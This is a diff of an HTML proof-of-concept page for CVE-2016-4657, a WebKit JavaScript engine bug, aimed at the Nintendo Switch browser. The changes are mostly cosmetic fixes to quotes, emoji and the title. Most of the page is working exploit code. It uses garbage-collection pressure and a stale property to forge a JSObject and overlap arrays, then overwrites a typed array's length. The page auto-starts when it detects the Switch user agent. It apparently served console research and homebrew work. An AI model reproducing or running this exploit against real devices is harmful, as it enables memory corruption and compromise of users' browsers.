@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
     <head>
-        <title>CVE-3850-4657 Switch PoC</title>
+        <title>CVE-2016-4657 Switch PoC</title>
         <style>
             body {font-size: 2em;}
             a {text-decoration: none; color: #000;}
@@ -9,17 +9,17 @@
         </style>
     </head>
     <body>
-        <h1>CVE-3850-4657 Nintendo Switch PoC</h1>
+        <h1>CVE-2016-4657 Nintendo Switch PoC</h1>
         <ul>
-           <a href="javascript:go();">go!</a>
-           <a href="javascript:reload();">reload</a>
+            <li><a href='javascript:go();'>🔥 go!</a></li>
+            <li><a href='javascript:document.location.reload();'>🔄 reload</a></li>
         </ul>
-        <div id="status"> waiting... click go.</div>
+        <div id='status'>😴 waiting... click go.</div>
 
             <script>
                 // display JS errors as alerts. Helps debugging.
                 window.onerror = function(error, url, line) {
-                    alert(error+\' URL:\'+url+\' L:\'+line);
+                    alert(error+' URL:'+url+' L:'+line);
                 };
             </script>
             <script>
@@ -30,7 +30,7 @@
                 //  + Retr0id
                 //  + Ando
                 //
-                // saelo\'s phrack article is invaluable: http://www.phrack.org/papers/attacking_javascript_engines.html
+                // saelo's phrack article is invaluable: http://www.phrack.org/papers/attacking_javascript_engines.html
 
                 // garbage collection stuff
                 var pressure = new Array(100);
@@ -82,7 +82,7 @@
                     var not_number = {};
                     not_number.toString = function() {
                         arr = null;
-                        props[\"stale\"][\"value\"] = null;
+                        props["stale"]["value"] = null;
 
                         // if bufs is already overlapping memory, bail out.
                         if (bufs[0]) return 10;
@@ -134,31 +134,31 @@
                     // get a reference to the target stale property, which points to arr
                     stale = target.stale;
 
-                    // make sure that the stale[0] points actually to the 0x41414141 data if not, we don\'t wanna mess with it and try again
+                    // make sure that the stale[0] points actually to the 0x41414141 data if not, we don't wanna mess with it and try again
                     if(stale[0]==0x41414141) {
                         // stale[0] is now pointing at a fake Integer 0x41414141. Now make it 0x41414242
                         stale[0] += 0x101;
                         //stale[0] = 0x41414242;
-                        //document.getElementById(\'status\').innerText = \'bug done.\';
+                        //document.getElementById('status').innerText = 'bug done.';
                         // searching the whole memory that is overlaying the old arr. Looking for 0x41414242
                         for (i = 0; i < bufs.length; i++) {
                             for (k = 0; k < bufs[0].length; k++) {
                                 // Found the value! bufs[i][k] point now at the same memory as stale[0]
                                 if (bufs[i][k] == 0x41414242) {
-                                    alert(\'Overlapping Arrays found at bufs[\'+i+\'][\'+k+\']\\nsmash.length is still: 0x\'+smash.length.toString(16));
+                                    alert('Overlapping Arrays found at bufs['+i+']['+k+']\nsmash.length is still: 0x'+smash.length.toString(16));
 
                                     // create a new object. Will look kinda like this:
                                     // 0x0100150000000136 0x0000000000000000 <- fictional value
-                                    // 0x0000000000000064 0x0000000000000000 <- [\'a\'],[\'b\']
-                                    // 0x???????????????? 0x0000000000000100 <- [\'c\'],[\'d\']
+                                    // 0x0000000000000064 0x0000000000000000 <- ['a'],['b']
+                                    // 0x???????????????? 0x0000000000000100 <- ['c'],['d']
                                     stale[0] = {
-                                        \'a\': u2d(105, 0), // the JSObject properties ; 105 is the Structure ID of Uint32Array
-                                        \'b\': u2d(0, 0),
-                                        \'c\': smash, // var pointing at the struct of a Uint32Array(0x10)
-                                        \'d\': u2d(0x100, 0)
+                                        'a': u2d(105, 0), // the JSObject properties ; 105 is the Structure ID of Uint32Array
+                                        'b': u2d(0, 0),
+                                        'c': smash, // var pointing at the struct of a Uint32Array(0x10)
+                                        'd': u2d(0x100, 0)
                                     }
 
-                                    alert(\'created the JSObject.\\nstale[0] = \'+stale[0]);
+                                    alert('created the JSObject.\nstale[0] = '+stale[0]);
 
                                     // remember the original stale pointer, pointing at the object with the a,b,c,d properties
                                     stale[1] = stale[0];
@@ -174,31 +174,31 @@
                                         structureID++;
 
                                         // assign the next structureID to the original object still referenced by stale[1]
-                                        stale[1][\'a\'] = u2d(structureID, 0);
+                                        stale[1]['a'] = u2d(structureID, 0);
                                     }*/
 
                                     // Give some information. stale[0] should now be a Uint32Array
-                                    alert(\'misaligned the pointer to the JSObject.\\nstale[0] = \'+stale[0]+\'\');
+                                    alert('misaligned the pointer to the JSObject.\nstale[0] = '+stale[0]+'');
 
                                     // write to the 6th 32bit value of the memory pointed to by the crafted Uint32Array
                                     // which should point to the struct of smash, allowing us to overwrite the length of smash
                                     stale[0][6] = 0x1337;
 
                                     // check the length of smash is now.
-                                    alert(\'smash.length is now: 0x\'+smash.length.toString(16));
+                                    alert('smash.length is now: 0x'+smash.length.toString(16));
 
-                                    alert(\'done!\\nswitch will probably crash now :O\');
+                                    alert('done!\nswitch will probably crash now :O');
                                     return;
                                 }
                             }
                         }
                     }
-                    document.getElementById(\'status\').innerText = \' fail. refresh the page and try again...\';
+                    document.getElementById('status').innerText = '💩 fail. refresh the page and try again...';
                     setTimeout(function() {document.location.reload();}, 1000);
                 }
 
                 function go() {
-                    document.getElementById(\'status\').innerText = \' go! \';
+                    document.getElementById('status').innerText = '🔥🔥🔥 go! 🔥🔥🔥';
                     dgc();
                     dgc();
                     dgc();
@@ -209,8 +209,8 @@
                 }
 
                 // if Switch browser is detected, auto start exploit
-                if(navigator.userAgent.indexOf(\'Nintendo Switch\')>-1) {
-                    document.getElementById(\'status\').innerText = \'Found Nintendo Switch! \';
+                if(navigator.userAgent.indexOf('Nintendo Switch')>-1) {
+                    document.getElementById('status').innerText = 'Found Nintendo Switch! 🤖';
                     setTimeout(go, 2000);
                 }
             </script>
